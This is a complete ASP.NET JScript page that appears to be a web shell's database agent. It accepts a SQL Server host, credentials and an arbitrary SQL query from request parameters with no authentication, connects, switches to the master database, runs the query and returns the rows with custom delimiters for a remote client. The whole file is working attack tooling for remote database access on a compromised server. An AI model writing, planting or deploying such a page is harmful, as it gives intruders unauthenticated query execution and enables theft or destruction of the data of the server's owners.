<%@ Page Language="JScript"%>
<%
var msg=false;
var err:Exception;
try {
    var Conn=new ActiveXObject("Adodb.connection");
    var strSQL:String=Request.Item["sql"];
    var db:String=Request.Item["db"];
    var host:String=Request.Item["host"];
    var user:String=Request.Item["user"];
    var pass:String=Request.Item["pass"];
    var conn_str:String="Driver={Sql Server};"+"Server={"+host+"};Database={"+db+"};Uid={"+user+"};Pwd={"+pass+"}";
    Conn.ConnectionString=conn_str;
    Conn.ConnectionTimeout=10;
    Conn.Open();
    Response.Write("Connect successfully![MSG]");
    msg=true;
    var Dat:String;Conn.DefaultDatabase="master";
    var Rs=Conn.Execute(strSQL);
    var i:Int32=Rs.Fields.Count,c:Int32;
    for(c=0;c < i;c++) {
        Response.Write(Rs.Fields(c).Name==""?"NULL":Rs.Fields(c).Name+"|");
    }
    Response.Write("[COLUMN_SPLIT]");
    while(!Rs.EOF && !Rs.BOF) {
        for (c=0; c < i ; c++) {
            Dat=Rs.Fields(c).Value;
            Response.Write(Dat==""?"NULL":Dat);
            Response.Write("|");
        }
        Response.Write("[ROW_SPLIT]");
        Rs.MoveNext();
    }
    Conn.Close()
} catch(err) {
    if(!msg) {
        Response.Write("[MSG]");
    }
    Response.Write("ERROR://"+err.message);
}
%>